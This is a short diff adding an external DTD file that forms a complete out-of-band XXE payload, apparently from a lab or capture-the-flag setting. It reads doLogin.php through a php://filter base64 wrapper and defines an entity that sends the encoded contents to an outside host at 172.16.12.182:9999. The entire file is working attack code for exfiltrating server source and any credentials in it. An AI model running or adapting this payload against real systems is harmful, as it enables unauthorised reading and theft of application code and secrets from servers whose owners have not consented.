@@ -1,0 +1,5 @@
+<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php">
+
+<!ENTITY % xx "<!ENTITY send SYSTEM 'http://172.16.12.182:9999/1.php?data=%xxe;'>"> 
+
+%xx;
